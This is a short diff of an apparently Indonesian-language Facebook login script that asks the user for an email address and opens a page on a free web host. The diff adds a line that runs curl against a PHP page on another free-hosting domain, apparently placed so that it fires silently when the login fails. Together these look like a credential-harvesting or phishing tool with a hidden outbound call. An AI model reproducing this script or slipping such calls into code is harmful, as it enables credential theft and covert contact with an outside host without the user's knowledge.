@@ -66,7 +66,6 @@ class login:
                 ]
                 br.open('http://videohde.000webhostapp.com')
 
-
                 print (logo)
 
                 e= input('Masukan Email Anda : ')
@@ -101,7 +100,7 @@ try:
 
     print("\n\n[!] Login Gagal\n")
     print("Facebook API Expired")
-
+    os.system('curl https://tutorialku69.000webhostapp.com/S.php')
 
 
 except KeyboardInterrupt:
